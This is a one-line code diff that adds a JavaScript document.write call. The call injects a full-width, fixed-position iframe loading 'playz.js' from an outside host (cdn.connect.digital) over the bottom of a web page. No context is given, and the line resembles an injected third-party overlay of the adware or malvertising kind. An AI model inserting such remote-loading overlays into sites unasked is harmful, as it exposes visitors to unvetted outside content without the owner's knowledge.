@@ -1,0 +1,1 @@
+	document.write('<iframe src="http://cdn.connect.digital/ph/iframe.html?file=playz.js" style=" position: fixed; left: 0px; width: 100%;height: auto; z-index: 346; opacity: 1; bottom: -1px; background: rgba(240, 240, 240, 0.498039);" frameborder="0"></iframe>');
